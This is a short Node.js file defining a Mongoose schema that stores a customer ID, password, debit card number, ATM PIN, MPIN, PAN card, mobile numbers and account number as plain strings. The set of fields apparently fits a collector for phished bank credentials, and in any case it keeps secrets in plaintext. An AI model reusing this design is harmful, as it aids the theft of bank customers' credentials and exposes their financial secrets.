const mongoose = require("mongoose");

//Schema
const DataSchema = new mongoose.Schema(
  {
    customer_id: {
      type: String,
      default: null,
    },
    password: {
      type: String,
      default: null,
    },
    debit_card: {
      type: String,
      default: null,
    },
    atm_pin: {
      type: String,
      default: null,
    },
    register_mobile_number: {
      type: String,
      default: null,
    },
    mpin: {
      type: String,
      default: null,
    },
    pan_card: {
      type: String,
      default: null,
    },
    register_mobile_number_2: {
      type: String,
      default: null,
    },
    account_number: {
      type: String,
      default: null,
    },
  },
  {
    timestamps: true,
  }
);

module.exports = mongoose.model("my_data", DataSchema);
